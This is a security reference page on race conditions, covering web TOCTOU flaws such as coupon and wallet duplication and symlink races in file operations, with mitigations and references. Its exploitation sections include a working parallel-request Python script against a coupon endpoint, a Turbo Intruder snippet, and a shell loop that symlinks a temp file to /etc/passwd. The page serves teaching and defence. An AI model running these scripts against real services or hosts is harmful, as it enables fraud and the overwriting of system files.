# Race Conditions

Race conditions occur when the timing or ordering of events affects program correctness
— and in web applications, this often manifests as TOCTOU (time-of-check time-of-use)
flaws in concurrent request handling.

---

## Concurrent Request Race (TOCTOU)

**Category:** Business Logic / Race Condition
**Severity context:** Medium to Critical — coupon abuse, wallet top-up duplication,
inventory over-allocation, or privilege escalation.

### How to identify it
Find operations that are read → check → write (e.g. read balance, check if ≥ amount,
deduct). Any operation that reads state, decides based on that state, and then writes
— without locking — is a race candidate. Also look for unique constraints enforced
only in application code (not the database).

### How it works
If two requests hit the same handler simultaneously, both may pass the "check" phase
before either completes the "write" phase. For example, both requests read a coupon
as "unused", both mark it as "used", and both apply the discount — doubling the benefit.

### Exploitation
```bash
# Use a race-condition tool (Turbo Intruder, Burp Multi-threaded, or custom script)
# Turbo Intruder — Burp extension (Python)

# Python asyncio race script
python3 -c "
import asyncio
import aiohttp

async def race(session, url, data):
    async with session.post(url, json=data) as resp:
        return await resp.text()

async def main():
    url = 'http://target.com/api/apply-coupon'
    data = {'coupon': 'FREE50'}
    async with aiohttp.ClientSession() as session:
        results = await asyncio.gather(*[race(session, url, data) for _ in range(20)])
        for r in results:
            print(r)

asyncio.run(main())
"

# Burp Turbo Intruder example (Python in Burp):
"""
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=10,
                           pipeline=False)
    for i in range(50):
        engine.queue(target.req, i)

def handleResponse(req, interesting):
    table.add(req)
"""

# Common race-prone endpoints:
# POST /api/gift-card/redeem
# POST /api/coupon/apply
# POST /api/wallet/top-up
# POST /api/vote
# POST /api/inventory/reserve
```

### Example
```
Endpoint:  POST /api/coupon/redeem  {"code": "SAVE50"}
Normal:    Single request → balance += 50, coupon marked used
Race:      20 parallel requests → balance += 1000, coupon used once
```

### Mitigation
Use database-level locking (`SELECT ... FOR UPDATE`, optimistic locking with version
columns) for critical operations. Use atomic operations (e.g. `UPDATE ... SET balance
= balance - ? WHERE balance >= ?` — the WHERE clause is the check). Apply unique
constraints at the database level (e.g. a `usage` table with a unique index on
`(coupon_id, user_id)`).

### References
- [PortSwigger: Race conditions](https://portswigger.net/web-security/race-conditions)
- [OWASP: Race Condition](https://owasp.org/www-community/vulnerabilities/Race_Condition)

---

## Time-of-Check Time-of-Use (File Operations)

**Category:** Race Condition / Privilege Escalation
**Severity context:** High — symlink following can lead to reading or overwriting
arbitrary files.

### How to identify it
Find features where the application writes to a temporary file in a shared directory
(e.g. `/tmp`, session files, cache files) using a predictable name. Also look for
file permission checks that are separate from the actual file open.

### How it works
The application checks a file's properties (ownership, permissions, existence) and
then performs an operation on it — but a local attacker (or another process) can
swap the file between the check and the use. A classic example: creating a symbolic
link from the expected filename to `/etc/cron.d/malicious` after the check but before
the write.

### Exploitation
```bash
# Symlink race — attacker creates a symlink during the window
# Victim process:
#   1. Checks: /tmp/tempfile.txt exists → yes (attacker created it)
#   2. Opens for writing: /tmp/tempfile.txt (now a symlink to /etc/passwd)
# Attacker:
while true; do
  ln -sf /etc/passwd /tmp/tempfile.txt
done
# When timed right, victim overwrites /etc/passwd

# PHP session file race — predictable session file location in /tmp
# If the application unserializes session data without locking, race to poison it

# Multi-threaded password reset race
# Same reset token generated for concurrent requests — one invalidates the other
# or both succeed with the same token
```

### Mitigation
Use atomic file operations (write to a temporary unique path, then `rename()` to the
target — rename is atomic on POSIX). Use dedicated temp directories with restricted
permissions per user. Never perform a separate permission check before opening a file
— open the file, then check its permissions (or use `O_NOFOLLOW` to reject symlinks).

### References
- [OWASP: Race Condition in File Operations](https://owasp.org/www-community/attacks/Race_condition_in_file_operations)
- [CWE-367: TOCTOU Race Condition](https://cwe.mitre.org/data/definitions/367.html)
